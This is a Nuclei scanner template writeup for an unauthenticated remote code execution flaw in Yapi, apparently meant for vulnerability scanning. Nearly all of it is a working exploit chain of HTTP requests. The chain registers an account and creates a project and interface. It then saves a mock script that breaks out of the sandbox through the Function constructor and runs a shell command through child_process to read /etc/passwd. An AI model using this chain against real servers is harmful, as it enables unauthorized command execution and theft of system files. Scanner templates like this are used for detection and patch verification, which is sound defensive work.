# Nuclei Template: Yapi - Remote Code Execution
**Template ID:** yapi-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`yapi-rce.yaml`)

## Vulnerability Information & PoC

## Description
Yapi allows remote unauthenticated attackers to cause the product to execute arbitrary code.

## Steps to reproduce / Exploit Payload
```http
POST /api/user/reg HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"email":"{{randstr}}@interact.sh","password":"{{randstr}}","username":"{{randstr}}"}

GET /api/group/list HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json, text/plain, */*

POST /api/project/add HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"name":"{{randstr}}","basepath":"","group_id":"{{group_id}}","icon":"code-o","color":"cyan","project_type":"private"}

GET /api/project/get?id={{project_id}} HTTP/1.1
Host: {{Hostname}}

POST /api/interface/add HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"method":"GET","catid":"{{project_id}}","title":"{{randstr_1}}","path":"/{{randstr_1}}","project_id":{{project_id}}}

POST /api/plugin/advmock/save HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json;charset=UTF-8

{"project_id":"{{project_id}}","interface_id":"{{interface_id}}","mock_script":"const sandbox = this\r\nconst ObjectConstructor = this.constructor\r\nconst FunctionConstructor = ObjectConstructor.constructor\r\nconst myfun = FunctionConstructor('return process')\r\nconst process = myfun()\r\nmockJson = process.mainModule.require(\"child_process\").execSync(\"cat /etc/passwd\").toString()","enable":true}

GET /mock/{{project_id}}/{{randstr_1}} HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.secpulse.com/archives/162502.html
- https://gist.github.com/pikpikcu/0145fb71203c8a3ad5c67b8aab47165b
- https://twitter.com/sec715/status/1415484190561161216
- https://github.com/YMFE/yapi
